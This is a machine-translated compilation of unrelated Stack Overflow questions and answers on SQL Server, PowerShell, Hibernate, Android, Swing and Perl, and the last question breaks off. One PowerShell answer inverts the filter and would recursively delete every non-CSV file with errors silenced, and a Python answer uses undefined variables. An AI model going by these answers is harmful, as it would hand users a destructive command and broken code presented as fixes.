临时表中的记录是否有任何限制..我已经尝试了 130 万条记录..将来我可能必须根据应用程序的要求处理数十亿条记录.. 可能吗？如果我能知道记录的限制..我可以尝试从源数据库中拆分记录并在限制范围内进行管理。提前致谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-10T07:41:59.460

tempdb 与任何其他数据库之间的差异很小，尤其是在限制方面。

如果可以将其存储在用户表中，则也可以将其存储在临时表中。它不必适合 RAM，因为 tempdb 就像任何其他数据库一样存储在磁盘上（只有更积极的缓存和更少的日志记录）。

来源：http: [//msdn.microsoft.com/en-us/library/ms190768.aspx](http://msdn.microsoft.com/en-us/library/ms190768.aspx)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-10T07:42:00.353

临时表是一个表，因此适用：[SQL Server 的最大容量规范](http://msdn.microsoft.com/en-us/library/ms143432.aspx)

> 每表行数
> 
> 受限于可用存储

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2015-05-26T21:30:40.483

[任何表都会遇到使用表值构造函数](https://msdn.microsoft.com/en-us/library/dd776382.aspx)的单个 T-SQL INSERT 语句可以插入的最大 1000 行的硬限制。

```
The number of row value expressions in the INSERT statement exceeds
the maximum allowed number of 1000 row values. 
```

[https://dba.stackexchange.com/questions/82921/the-number-of-row-value-expressions-in-the-insert-statement-exceeds-the-maximum](https://dba.stackexchange.com/questions/82921/the-number-of-row-value-expressions-in-the-insert-statement-exceeds-the-maximum "#8291")

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-04-10T07:44:43.813

不，临时表没有记录限制（限制是磁盘空间）。但要小心，因为临时表是在 tempdb 数据库中物理创建的，并且该数据库必须放置在大小合适的磁盘上。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-10T07:53:54.430

临时表[存储在 tempdb 数据库](http://msdn.microsoft.com/en-us/library/ms190768%28v=sql.100%29.aspx)中，只要 tempdb 本身可以增长（即直到磁盘已满），它们就可以增长。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-04-10T07:36:22.207

在您的服务器内存（即磁盘）支持之前，您将多少条记录推入临时表是没有问题的。

我认为您在临时表中推送的记录数没有限制。

# file - 如何使用powershell判断某些类型的文件（如csv文件）存在？

> ID：10084858
> 
> 赞同：0
> 
> 时间：2012-04-10T07:33:06.170
> 
> 标签：file, powershell, get-childitem

我需要一个函数来删除文件夹 A 中的所有 csv 文件，如果文件夹 A 中有 csv 文件，则删除所有 csv 文件（实际上，我不知道文件夹 A 中确切的 csv 文件名称）；如果文件夹 A 中没有 csv 文件，则什么也不做。我搜索了一个关于删除 mp3 文件的主题： [Powershell - 删除所有非 mp3 文件](https://stackoverflow.com/questions/3086861/powershell-delete-all-non-mp3-files)

然后我把这个例子拿出来，下面是删除文件夹 A 中我的 csv 文件的 cmdlet：

```
Get-childitem -Recurse | Where-Object {$_.Extension -eq '.csv'} | 
Remove-Item -whatIf 
```

但是有一个问题，当文件夹 A 中没有 csv 文件时，在上面执行 cmd 时会导致错误。我只是不知道如何判断csv文件是否存在，其他人可以帮忙吗？非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T07:43:54.223

您可以简单地添加`-ErrorAction`以`remove-item`跳过错误：

```
Get-childitem -Recurse | Where-Object {$_.Extension -ne '.csv'} | 
Remove-Item -ErrorAction SilentlyContinue 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T10:49:57.007

在执行删除之前使用 if 构造来测试条件是否为真：

```
if(gci c:\folderA -filter *.csv){do-something} 
```

如果括号之间的语句返回 false，则不执行大括号之间的代码。

# hibernate - 如何映射两个具有 pojo 的表，但它们之间的关系在没有 pojo 的第三个表中定义

> ID：10084860
> 
> 赞同：2
> 
> 时间：2012-04-10T07:33:26.550
> 
> 标签：hibernate

我正在为应用程序使用hibernate。我有两个具有多对多关系的表，并且它们都有POJO。但是关系是在没有POJO的第三个表中定义的。我如何关联我的两个表并使用它们

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T07:52:58.210

假设您有 TableA 和 TableB 的 POJO，并且希望在 Table C 中关联它们之间的多对多关系，而不为 TableC 创建 POJO。

如果表 C 仅包含对表 A 和表 B 具有外键约束的两列，则可以使用`@ManyToMany`and来实现`@JoinTable`：

```
@Entity
public class TableA{

  @ManyToMany
  @JoinTable(
        name = "TableC",
        joinColumns = {@JoinColumn(name = "TableA_ID")},
        inverseJoinColumns = {@JoinColumn(name = "TableB_ID")}
  )
  private List<TableB> tableB= new ArrayList<TableB>();

}

@Entity
public class TableB{

  @ManyToMany(mappedBy="tableB")
  private List<TableA> tableA= new ArrayList<TableA>();

} 
```

但是，如果表 C 包含更多对其他表没有外键约束的附加列（例如 列`last_modified_date`），则不能这样做，并且必须将表 C 声明为 POJO 并将[多对多关联建模为两个一与表 C 的多对多关联](http://www.mkyong.com/hibernate/hibernate-many-to-many-example-join-table-extra-column-annotation/)。

# ssl - 银行交易中使用的 256 位加密有多安全

> ID：10084861
> 
> 赞同：3
> 
> 时间：2012-04-10T07:33:29.977
> 
> 标签：ssl

大多数银行使用 128 位或 256 位加密。这是什么意思？这是否意味着 ssl 中使用的密钥是 128 位长还是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T07:54:26.320

是的，128 位和 256 位是加密密钥的大小。

请注意，这并没有真正说明底层加密算法的安全性，因为某些算法（例如 MD5）存在漏洞，这使得它们比比特数所指示的更容易解密（参见[http://www.win .tue.nl/hashclash/rogue-ca/](http://www.win.tue.nl/hashclash/rogue-ca/)）。

# windows - 是否可以在 windows 上的 eclipse + mingw 中编译 node.js？

> ID：10084862
> 
> 赞同：4
> 
> 时间：2012-04-10T07:33:45.780
> 
> 标签：windows, node.js, compilation, eclipse-cdt

我是 node.js 的新手。目前我在一个 IDE eclipse 上开发我所有的东西（c++/web/java），我想开始使用 node.js 进行开发。从网上看，我没有找到任何严格的答案，但我可以在 windows 上的 eclipse cdt 中编译 node.js 吗？
谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-01-16T05:18:00.023

可以按照[本指南](https://github.com/joyent/node/wiki/Installation#building-on-windows)在 Windows上构建/编译 Node.js。

然而，正如这里已经提到的，Node.js 已经在 Windows 上可用。你可以[安装它](http://nodejs.org/download/#installers)。

安装它很可能是最不痛苦的方式。

# jquery - jQuery ajax (with rails): 在运行时指定 dataType

> ID：10084866
> 
> 赞同：0
> 
> 时间：2012-04-10T07:34:10.823
> 
> 标签：jquery, ajax, ruby-on-rails-3

我有一个带有 jquery-ujs 的 rails 3 应用程序，我想知道是否可以在运行时动态指定 ajax 调用的数据类型。通过绑定 ajax 事件，我的链接都是不显眼的：

```
item.bind("ajax:beforeSend", function(e, request, settings) {
    ...
}); 
```

但不幸的是，默认数据类型是 json，我想知道是否可以在 ajax 调用之前更改它。我知道我可以这样做，在每个链接的基础上：

```
<%= link_to('My Link', path,
        :remote => true,
        :method => :put,  
        :id => 'my-link',
        'data-type' => 'html', 
        :class => 'button') %> 
```

但这不是很干燥，因为我必须在每个链接上都这样做。

我发现我可以这样全局设置这个字段：

```
$.ajaxSetup({ dataType: 'html' }); 
```

但我想知道是否有人知道如何在 bind 方法中或在项目本身上执行此操作？

唯一想到的（在我写这篇文章时）是将数据类型属性添加到 JS 中的标记，但我不确定在 JS 执行时是否已经设置了 ajax。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T07:41:27.897

对我来说，一种快速而肮脏的方式：将后缀添加到 url：

```
"#{link_to some_path}.html"
"#{link_to some_path}.js" 
```

# python - 如何提高嵌套 if 和 for 语句的可读性

> ID：10084867
> 
> 赞同：0
> 
> 时间：2012-04-10T07:34:12.270
> 
> 标签：python, for-loop, refactoring

我有一段非常讨厌的代码我想重构，但我有，因为它变得完全不可读。

```
 for region in feed['config']['regions']:
            if region['region'] == region_name:
                for instance_type in region['instanceTypes']:
                    if instance_type['type'] == instance_type_name:
                        for instance_size in instance_type['sizes']:
                            if instance_size['size'] == instance_size_name:
                                for platform in instance_size['valueColumns']:
                                    if platform['name'] == platform_name:
                                        prices = platform['prices']
                                        assert prices.keys() == ['USD']
                                        return decimal.Decimal(prices['USD'])
        assert False, "Failed to determine price for instance with region=%r, type=%r, size=%r, platform=%r" % \
                (region_name, instance_type_name, instance_size_name, platform_name) 
```

我一直在为每个循环或 if 语句使用函数，但这会给我带来很多函数。有更好的解决方案吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-10T07:46:03.587

```
try:
    region = [r for r in feed['config']['regions'] if region['region'] == region_name][0]
    instance_type = [t for t in region['instanceTypes'] if i['type'] == instance_type_name][0]
    # ...
    return decimal.Decimal(prices['USD'])
except IndexError:
    raise Exception("Failed to determine price for instance with region=%r, type=%r, size=%r, platform=%r" % 
                (region_name, instance_type_name, instance_size_name, platform_name)) 
```

或者更进一步：

```
def filter_by_key(key, value, objects):
    return [o for o in objects if region[key] == value][0]

try:
    region = filter_by_key('region', region_name, feed['config']['regions'])
    instance_type = filter_by_key('type', instace_type_name, region['instanceTypes'])
    # ...
    return decimal.Decimal(prices['USD'])
except IndexError:
    raise Exception("Failed to determine price for instance with region=%r, type=%r, size=%r, platform=%r" % 
                (region_name, instance_type_name, instance_size_name, platform_name)) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-10T07:44:32.697

如果您想将其保持在循环中，您可以使用它`continue`来保存缩进：

```
for region in feed['config']['regions']:
    if region['region'] != region_name: continue
    for instance_type in region['instanceTypes']:
        if instance_type['type'] != instance_type_name: continue
        for instance_size in instance_type['sizes']:
            if instance_size['size'] != instance_size_name: continue
            for platform in instance_size['valueColumns']:
                if platform['name'] != platform_name: continue
                prices = platform['prices']
                assert prices.keys() == ['USD']
                return decimal.Decimal(prices['USD'])
assert False, "Failed to determine price for instance with region=%r, type=%r, size=%r, platform=%r" % \
                (region_name, instance_type_name, instance_size_name, platform_name) 
```

或者使用列表推导：

```
regions = (r for r in feed['config']['regions'] if r['region'] == region_name)
instance_types = (i for i in r['instanceTypes'] for r in regions if i['type'] == instance_type_name)
instance_sizes = (i for i in t['sizes'] for t in instance_types if i['size'] == instance_size_name)
platforms = (p for p in s['valueColumns'] for s in instance_sizes if p['name'] == platform_name)
for platform in platforms:
    prices = platform['prices']
    assert prices.keys() == ['USD']
    return decimal.Decimal(prices['USD'])
assert False, "Failed to determine price for instance with region=%r, type=%r, size=%r, platform=%r" % \
                (region_name, instance_type_name, instance_size_name, platform_name) 
```

# android - 包含的 xml 布局的访问视图

> ID：10084869
> 
> 赞同：1
> 
> 时间：2012-04-10T07:34:20.543
> 
> 标签：android, android-relativelayout

我需要访问另一个 b.xml 布局中包含的 a.xml 布局中的视图。例如，这是一个.xml

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent" >

        <Button
            android:id="@+id/xyz"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="XYZ" />
</RelativeLayout> 
```

而且，在 b.xml

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" >

    <include
        android:id="@+id/a_layout"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        layout="@layout/a" />

    <TextView
        android:id="@+id/label"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_below="@id/xyz"
        android:text="Show me below xyz" />
</RelativeLayout> 
```

我必须在 xml 代码中执行它，因为如果我在 Java 中执行它必须在 setContentView() 之后，然后设置 TextView 'label' 的 LayoutParams 将不会生效。

我想，每个人都明白我想问什么。等待好的答复。

谢谢大家。

右边的图像是我想要实现的，左边的图像是我用当前代码得到的。

![这就是我用当前的 xml 代码得到的](../Images/9ccd2119e5aa2796b4a0994aa1100c30.png) ![这就是我想要做的](../Images/b3fd9738bbec8717e506796696e21670.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T08:13:54.237

在 b.xml 中，您应该更正：

```
android:layout_below="@id/xyz" 
```

至

```
android:layout_below="@id/a_layout" 
```

然后你可以在你的代码中使用它（这里我把它放在 onCreate 中）：

```
setContentView(R.layout.b);    
((Button)findViewById(R.id.xyz)).setOnClickListener(new OnClickListener() {
        @Override
        public void onClick(View v) {
            ((TextView)findViewById(R.id.label)).setText("clicked on XYZ button");
        }
    }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T08:35:33.297

问题不在于访问`View`包含的布局，而在于您无法实现此布局“重叠”。让我解释一下：如果您在按钮下方添加更多视图`a.xml`，然后尝试在`b.xml`按钮下方放置一些视图，那么它将使视图来自`b.xml`重叠视图`a.xml`，但是这还没有在 Android 中实现（还没有？ ）。所以，你唯一能做的就是`android:layout_below="@id/a_layout"`按照@Hoàng Toản 的建议。

PS您可能会观察到与此`a`+`b`布局组合相同的行为：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" >

    <RelativeLayout
        android:layout_width="fill_parent"
        android:layout_height="fill_parent" >

        <Button
            android:id="@+id/xyz"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="XYZ" />
    </RelativeLayout>

    <TextView
        android:id="@+id/label"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_below="@id/xyz"
        android:text="Show me below xyz" />
</RelativeLayout> 
```

# asp.net - 如何使用动态数据设计水晶报表

> ID：10084876
> 
> 赞同：0
> 
> 时间：2012-04-10T07:34:46.737
> 
> 标签：asp.net, crystal-reports-2008

下午好开发人员，这是我生成水晶报表的函数，这将报表名称和报表查询作为输入参数，并将生成一个数据集，有了这个数据集我如何设计我的报表？因为这是在运行时生成的, 我怎样才能访问它来生成我的 ReportDesign？

```
public void fnLoadDataToReport(string rptName, string rptQuery)
{
    try
    {
        DataSet myDS=new DataSet();
//      crReportDocument.Load(Server.MapPath("Reports\" & RptName), OpenReportMethod.OpenReportByTempCopy);
        crReportDocument.Load(Server.MapPath("Reports\\" + rptName ));
        SqlConnection myConnection=new SqlConnection(ConfigurationManager.ConnectionStrings["mycon"].ConnectionString);
        SqlCommand myCommand=new SqlCommand(rptQuery,myConnection);
        SqlDataAdapter MyDA=new SqlDataAdapter(myCommand);
        MyDA.Fill(myDS,"ReportTable");
        crReportDocument.SetDataSource(myDS);
        crvReportGeneration.ReportSource=crReportDocument;
        crvReportGeneration.ShowFirstPage();
    }
    catch(Exception ex)
    {
        Response.Write(ex.Message);
    }
} 
```

任何帮助都是可观的......！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T20:49:55.853

您所需要的只是**数据集的****XML 模式定义**，以便能够设计报告。这可以通过以下代码来实现。

 **```
private void WriteSchemaToFile(DataSet thisDataSet){
   // Set the file path and name. Modify this for your purposes.
   string filename="mySchema.xml";
   // Write the schema to the file.
   thisDataSet.WriteXmlSchema(filename);
} 
```

现在将上面创建的文件添加到您的项目中。

现在在设计报告时选择**Database Expert并选择****Project**下的 xml 文件。并添加它（就像添加表或视图一样）。

现在你可以走了。其余步骤相同。

只需确保 XSD 架构的名称和数据集中的表名称完全匹配即可。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T18:08:48.923

为什么使用 DataSet 作为报告的来源。相反，如果您使用存储过程作为源，它将解决您的问题并且维护也将更加容易**

# hibernate - 映射 hbm 以作为 @mappedclass 注释进行继承

> ID：10084882
> 
> 赞同：2
> 
> 时间：2012-04-10T07:35:30.810
> 
> 标签：hibernate, inheritance, hbm

我正在使用 hbm 文件（以保留没有注释的纯 pojo 类），并且我想使用具有技术信息（id、创建/修改日期和用户）的超类作为 @mappedclass 注释。

```
<hibernate-mapping>
<class name="AbstractEntity" abstract="true">
    <id name="entityId"></id>
    <!-- Id overridé dans les classes filles -->
    <property name="userCreation" type="string">
        <column name="USR_LOG_I" length="20" not-null="true" />
    </property>
    <property name="dateCreation" type="timestamp">
        <column name="DTE_LOG_I" length="26" not-null="true" />
    </property>
    <property name="userModification" type="string">
        <column name="USR_LOG_U" length="20" not-null="true" />
    </property>
    <property name="dateModification" type="timestamp">
        <column name="DTE_LOG_U" length="26" not-null="true" />
    </property>
    <property name="audit" type="string">
        <column name="AUDIT" length="10" />
    </property>
</class> 
```

如何在孩子中声明抽象继承？可能吗 ？？

```
hibernate-mapping>
<class name="FilleEntity" table="MA_TABLE">....... 
```

谢谢你的帮助 ！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-21T06:18:54.123

也许这就是你正在寻找的：

```
<class name="FilleEntity" table="MA_TABLE">
    <meta attribute="extends">AbstractEntity</meta> 
```

# java - 在java中设置按钮单击的延迟？

> ID：10084884
> 
> 赞同：4
> 
> 时间：2012-04-10T07:35:34.407
> 
> 标签：java, swing, concurrency, timer

我有一个保存按钮`JFrame`；单击保存时，将“保存”文本设置为“保存....”；我需要在延迟 10 秒后将该文本设置为“已保存”。在 java 中怎么可能？请帮忙...

```
try {
    Thread.sleep(4000);
} catch (InterruptedException e) {

    e.printStackTrace();
} 
```

这就是我所做的……但这在延迟时间内不会显示为“保存”。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-10T07:46:56.513

如果您想向用户提供正在发生的事情的视觉反馈（并且可能给出有关进度的一些提示），那么请选择[`JProgressBar`](http://docs.oracle.com/javase/tutorial/uiswing/components/progress.html)和[`SwingWorker`](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/worker.html)（[更多详细信息](https://stackoverflow.com/questions/5148995/problem-making-a-jprogressbar-update-values-in-loop-threaded)）。

另一方面，如果您想遇到一种情况，当用户单击按钮并且任务应该在后台运行（而用户执行其他操作时），那么我将使用以下方法：

```
button.addActionListener(new ActionListener() {
    @Override
    public void actionPerformed(ActionEvent e) {                                          
        button.setEnabled(false); // change text if you want
        new SwingWorker<Void, Void>() {
            @Override
            protected Void doInBackground() throws Exception {
                // Do the calculations
                // Wait if you want
                Thread.sleep(1000);
                // Dont touch the UI
                return null;
            }
            @Override
            protected void done() {
                try {
                    get();
                } catch (Exception ignore) {
                } finally {
                    button.setEnabled(true); // restore the text if needed
                }
            }                    
        }.execute();
    }
}); 
```

最后，使用[`Swing`特定计时器](http://docs.oracle.com/javase/tutorial/uiswing/misc/timer.html)的初始解决方案：

```
final JButton button = new JButton("Save");
button.addActionListener(new ActionListener() {
    @Override
    public void actionPerformed(ActionEvent e) {                                          
        // Take somehow care of multiple clicks
        button.setText("Saving...");
        final Timer t = new Timer(10000, new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                button.setText("Saved");
            }
        });
        t.setRepeats(false);
        t.start();
    }
}); 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-04-10T08:39:38.203

这个问题和前 3 个答案走错了路。

*   使用 a`JProgressBar`表示正在发生的事情。如果不知道任务的长度，将其设置为不确定，但想必您知道需要保存多少以及当前保存多少。
*   不要阻塞 EDT（事件调度线程）——当这种情况发生时，GUI 将“冻结”。用于`SwingWorker`长时间运行的任务。有关更多详细信息，请参阅[Swing 中的并发。](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-10T07:44:49.787

最好的办法是使用计时器，它的方法延迟执行：http: [//developer.apple.com/library/mac/documentation/java/reference/javase6_api/api/java/util/Timer.html#schedule (java .util.TimerTask](http://developer.apple.com/library/mac/documentation/java/reference/javase6_api/api/java/util/Timer.html#schedule(java.util.TimerTask)，长）。使用 timertask 来包装你的 runnable，就是这样。

# android - 在Android中专注于底部编辑文本时出现键盘问题

> ID：10084886
> 
> 赞同：11
> 
> 时间：2012-04-10T07:35:59.793
> 
> 标签：android, android-layout, android-view, android-keypad

我正在开发一个我愿意从用户那里获得输入的android应用程序。我为它创建了一个布局，它有一个滚动视图作为根视图和相对布局，因为它是子视图，所有其他布局都在这个相对布局内。但是，当编辑文本位于屏幕底部并且用户单击它以带上键盘时，它会在编辑文本和键盘之间显示一些空白框，然后如果用户输入任何单词，它就不会显示在编辑文本中。但是，如果编辑文本几乎超过屏幕大小的一半，它就可以正常工作。您可以通过查看下面的图像更清楚

[这是我的代码](http://pastebin.com/t4dcpqNn)

![在此处输入图像描述](../Images/27b96533d61258d7a0c88249f4dc5174.png)

![在此处输入图像描述](../Images/a75da1921cc7f820159965030b452800.png)

![在此处输入图像描述](../Images/99a1cda17b4c4a51b24c5f8399b38159.png)

有人遇到过这种问题吗？？请帮忙！！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T22:06:23.827

*在清单 ( android:windowSoftInputMode="adjustPan"* )中的 Activity 上设置的默认 IME 模式将平移主布局，因此文本字段位于可视区域的中间。虽然您的大部分内容都在可滚动区域中，但它只是移动整个区域而不是将内容滚动到视图中。如果您使用*android:windowSoftInputMode="adjustNothing"*它将阻止布局平移，但也将有效地什么也不做，只是覆盖您的原始输入。

我的建议是使用adjustResize，这可能会为您解决问题。如果没有，您必须考虑进行一些自定义滚动区域聚焦。

# iphone - 连接失败后AFNetworking是否有重新连接方法

> ID：10084888
> 
> 赞同：1
> 
> 时间：2012-04-10T07:36:00.870
> 
> 标签：iphone, objective-c, ios, afnetworking

AFNetworking 连接失败后，有什么方法可以重新连接？

如果有，我可以控制重新连接超时和重新连接时间吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-17T22:14:57.483

虽然这不是 AFNetworking 的当前功能，但 AFNetworking 使用的 Foundation URL 加载系统非常强大，并且会自动尽最大努力使请求工作。

您最好的办法是在请求操作的失败块中重新请求并向用户发送任何消息。

# android - 在android中使用webservice

> ID：10084889
> 
> 赞同：0
> 
> 时间：2012-04-10T07:36:06.950
> 
> 标签：android, web-services, consuming

[http://jatin4rise.wordpress.com/2010/10/03/webservicecallfromandroid/](http://jatin4rise.wordpress.com/2010/10/03/webservicecallfromandroid/) 上面的链接教我如何在 android 中正常使用 web 服务，问题是它只是在加载后打印一些文本。但我需要使用单击时使用按钮的网络服务。请让我知道代码或一些示例代码。

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:56:33.980

这与 Web 服务消费完全无关。

您需要在按钮上实现 OnClick，然后让它调用一个函数来运行该代码。

```
private void consumeWS(){    
    try
    {
        SoapObject request = new SoapObject(NAMESPACE, METHOD_NAME);
        request.addProperty(“i”, 5);
        request.addProperty(“j”, 15);
        SoapSerializationEnvelope envelope = new SoapSerializationEnvelope(SoapEnvelope.VER11);
        envelope.dotNet = true;
        envelope.setOutputSoapObject(request);
        HttpTransportSE androidHttpTransport = new HttpTransportSE(URL);
        androidHttpTransport.call(SOAP_ACTION,envelope);
        Object result = envelope.getResponse();
    } catch (Exception e) {
        e.printStackTrace();
    }
}

    @Override
    public void onClick(View v) {
        switch(v.getId()){
        case R.id.btnSubmit: consumeWS(); break;
        }
    } 
```

# grep - 跨多个文件的匹配模式：perl 还是 grep？

> ID：10084890
> 
> 赞同：1
> 
> 时间：2012-04-10T07:36:15.160
> 
> 标签：grep

我有一个 pattern.txt 文件，如下所示：

```
2gqt+FAD+A+601   2i0z+FAD+A+501
1n1e+NDE+A+400   2qzl+IXS+A+449
1llf+F23+A+800   1y0g+8PP+A+320
1ewf+PC1+A+577   2a94+AP0+A+336
2ydx+TXP+E+1339   3g8i+RO7+A+1
1gvh+HEM+A+1398   1v9y+HEM+A+1140
2i0z+FAD+A+501   3m2r+F43+A+1
1h6d+NDP+A+500   3rt4+LP5+C+501
1w07+FAD+A+1660   2pgn+FAD+A+612
2qd1+PP9+A+701   3gsi+FAD+A+902 
```

还有一个名为 data 的文件（大小约为 8gb），其中包含这样的行。

```
2gqt+FAD+A+601   2i0z+FAD+A+501    0.874585  0.785412
1n1e+NDE+A+400   2qzl+IXS+A+449    0.145278  0.589452
1llf+F23+A+800   1y0g+8PP+A+320    0.784512  0.341786
1ewf+PC1+A+577   2a94+AP0+A+336    0.362542  0.784785
2ydx+TXP+E+1339   3g8i+RO7+A+1     0.251452  0.365298
1gvh+HEM+A+1398   1v9y+HEM+A+1140  0.784521  0.625893
2i0z+FAD+A+501   3m2r+F43+A+1      0.369856  0.354842
1h6d+NDP+A+500   3rt4+LP5+C+501    0.925478  0.365895
1w07+FAD+A+1660   2pgn+FAD+A+612   0.584785  0.325863
2qd1+PP9+A+701   3gsi+FAD+A+902    0.874526  0.125453 
```

然而，数据文件并不像上面给出的那么简单。该文件的大尺寸是由于其中大约有 18000 行，它们从每行的第一列中的字符串开始。即以2gqt+FAD+A+601开头的18000行，后跟以1n1e+NDE+A+400开头的18000行。但是只有一个这样的行与给定的模式匹配，如 pattern.txt

我正在尝试将 pattern.txt 中的行与数据匹配并希望打印出来：

```
2gqt+FAD+A+601   2i0z+FAD+A+501 0.785412
1n1e+NDE+A+400   2qzl+IXS+A+449 0.589452
1llf+F23+A+800   1y0g+8PP+A+320 0.341786
1ewf+PC1+A+577   2a94+AP0+A+336 0.784785  
2ydx+TXP+E+1339   3g8i+RO7+A+1  0.365298
1gvh+HEM+A+1398   1v9y+HEM+A+114 0 0.625893
2i0z+FAD+A+501   3m2r+F43+A+1 0.354842
1h6d+NDP+A+500   3rt4+LP5+C+501 0.365895
1w07+FAD+A+1660   2pgn+FAD+A+612 0.325863
2qd1+PP9+A+701   3gsi+FAD+A+902 0.125453 
```

截至目前，我在 perl 中使用了一些东西，如下所示：

```
use warnings;
open AS, "combi_output_2_fixed.txt";
open AQ, "NAMES.txt";
@arr=<AS>;
@arr1=<AQ>;
foreach $line(@arr)
{
    @split=split(' ',$line);
    foreach $line1(@arr1)
    {
     @split1=split(' ',$line1);
     if($split[0] eq $split1[0] && $split[1] eq $split1[1])
     { print $split1[0],"\t",$split1[1],"\t",$split1[3],"\n";}
   }

}
close AQ;
close AS; 
```

这样做会耗尽整个内存：并显示内存不足错误消息。我知道这可以使用 grep 完成。但不知道怎么做。谁能告诉我如何使用 grep -F 并且不使用整个内存来做到这一点？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T07:50:31.300

`pattern.txt`适合记忆吗？

如果是这样，您可以使用类似于`grep -F -f pattern.txt data.txt`将 data.txt 中的行与模式匹配的命令。但是，您将获得完整的行，并且需要额外的处理才能仅获得第二列数字。

或者您可以修复 Perl 脚本。内存不足的原因是因为您将 8gb 文件完全读取到内存中，而您可以像 grep 一样逐行处理它。对于 8GB 文件，您应该使用如下代码：

```
open FH, "<", "data.txt";
while ($line = <FH>) { 
    # check $line against list of patterns ...
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T07:50:58.430

尝试这个

```
grep "`more pattern.txt`" data.txt | awk -F' ' '{ print $1 " "  $2 " " $4}' 
```

# jquery - 如何将单个图像上传到文件夹？

> ID：10084891
> 
> 赞同：0
> 
> 时间：2012-04-10T07:36:18.387
> 
> 标签：jquery, image, upload

我需要将单个图像上传到文件夹。我的表单中也有一些文本框。如果我用户`enctype="multipart/form-data"`的意思是 getParameter 无法识别。我不喜欢用`enctype="multipart/form-data"`。如何上传？任何 Jquery 插件？还是其他？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T07:46:52.337

jQuery 上传：[这里](http://blueimp.github.com/jQuery-File-Upload/). 您可以去下载并在 zip 存档中获取所有源代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T07:42:53.613

你应该使用`$_FILES`

简单的教程可以在[这里找到](http://www.w3schools.com/php/php_file_upload.asp)

不需要使用 jQuery

# html - 字体显示不好

> ID：10084895
> 
> 赞同：0
> 
> 时间：2012-04-10T07:36:31.300
> 
> 标签：html, css, wordpress, firefox, cross-browser

我有一个 wordpress 网站[http://itrain.com.my/v3/](http://itrain.com.my/v3/)作为我的主页

我想知道为什么它在 Firefox 中显示不好？

有谁擅长css吗？

顺便说一下，尝试查看子页面[http://www.itrain.com.my/v3/index.php/about-us/](http://www.itrain.com.my/v3/index.php/about-us/)

它显示得很好。

我真的很想知道为什么会这样。

任何可以帮助我？有什么建议，推荐吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T07:58:05.243

我认为问题出在 URL 上。它工作[http://www.itrain.com.my/v3/但在](http://www.itrain.com.my/v3/)[http://itrain.com.my/v3/](http://itrain.com.my/v3/)上不起作用

在您的服务器上设置从非 www URL 到 www URL 的重定向 (301)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T07:51:55.140

我敢打赌你在本地机器上安装了字体。我在任何浏览器上都看不到它。相反，我收到两个 404 错误。

换句话说：请确保字体文件在它们各自的位置可用：`http://www.itrain.com.my/v3/wp-content/themes/itrain/img/fonts/big_noodle_titling-webfont.woff`和`http://www.itrain.com.my/v3/wp-content/themes/itrain/img/fonts/bebas__-webfont.woff`.

[编辑]

我刚刚查看了您网站上的字体目录列表。您的字体的 ttf 和 eot versionf 可用，woff 和 svg 已列出，但会导致 404 错误。此外，ttf 版本（在 Firefox 中下载而不是 woff，在获得 404 后）似乎生成了一个空的 HTTP 响应。

所以...确保字体在那里，确保它们具有适当的权限设置（如 0644）。除了字体文件本身，我看不到任何其他问题，因为 CSS 似乎是正确的。

[编辑 2]

@kubedan 提供了一个很好的提示，似乎符合您对 htaccess 的关注：字体下载的域总是以`www`. Firefox 会拒绝下载此类内容，您需要使用相同的域。

# asp.net-mvc-3 - .net mvc 表单登录 url 重定向

> ID：10084898
> 
> 赞同：0
> 
> 时间：2012-04-10T07:36:49.433
> 
> 标签：asp.net-mvc-3, asp.net-membership

净 mvc 3 应用程序。

我的登录表单有问题。

